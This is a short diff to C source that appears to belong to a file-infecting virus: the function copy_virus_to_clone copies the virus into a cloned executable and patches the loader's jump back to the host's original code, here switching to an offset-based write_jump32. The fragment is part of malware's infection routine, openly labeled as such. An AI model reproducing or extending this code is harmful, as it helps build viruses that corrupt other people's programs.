@@ -39,7 +39,9 @@ bool		copy_virus_to_clone(struct safe_ptr clone_ref,
 		return errors(ERR_VIRUS, _ERR_V_COPY_VIRUS_TO_CLONE);
 
 	// write new addr into clone's loader code
-	write_jump(back_to_client_jump, rel_jump_client, DWORD);
+	const size_t	back_to_client_jump_offset = back_to_client_jump - clone_ref.ptr;
+
+	write_jump32(clone_ref, back_to_client_jump_offset, rel_jump_client);
 
 	return true;
 }
